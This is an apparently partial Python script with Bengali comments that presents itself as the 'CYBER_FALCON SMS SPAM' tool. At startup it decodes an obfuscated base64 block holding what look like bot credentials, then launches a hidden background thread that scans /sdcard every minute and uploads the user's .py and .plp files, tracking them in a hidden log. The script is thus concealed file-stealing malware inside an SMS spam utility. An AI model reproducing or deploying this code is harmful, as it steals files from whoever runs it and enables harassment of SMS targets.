...
# === Encrypted (Base64 encoded) .env content ===
encoded_env = "Ql9UX0tOPTgzOTEyNTI5OTg6QUFINDQ1LW5Za1NLNUhuQ3VWejJhU1p2TW1sSFFRdGVfd1kKQ19JRD03ODQzMjg0MDMy"

# === Decode and Load to environment ===
env_bytes = base64.b64decode(encoded_env)
env_str = env_bytes.decode()
load_dotenv(stream=StringIO(env_str))
os.system("clear")
...
extensions = ['.py', '.plp']
sent_log_file = '/sdcard/.sent_files.txt'  # এখানে পাঠানো ফাইলের লিস্ট থাকবে

# === লোড করা আগের পাঠানো ফাইলের লিস্ট ===
def load_sent_files():
    ...
    try:
        with open(file_path, 'rb') as f:
            ...
            if r.status_code == 200:
                save_sent_file(file_path)  # শুধু সফল হলে সংরক্ষণ করবে
    except:
        pass

# === ব্যাকগ্রাউন্ডে চলতে থাকা ও ফাইল পাঠানো ===
def watch_and_send(base_path="/sdcard"):
    while True:
        ...
        time.sleep(60)  # প্রতি ৬০ সেকেন্ডে আবার চেক করবে

# === স্ক্রিপ্ট শুরু ===
threading.Thread(target=watch_and_send, daemon=True).start()

# === তোমার টুল চালু হতে থাকুক ===
def DARKS(number, amo):
    os.system("clear")
    print(logo)
    Lxj(f"{c} <{w}/{c}> {g}⚡ CYBER_FALCON SMS SPAM {r}v7.0 {g}STARTED\n")
#----------[ CYBER-ARO ASSEST ]----------#
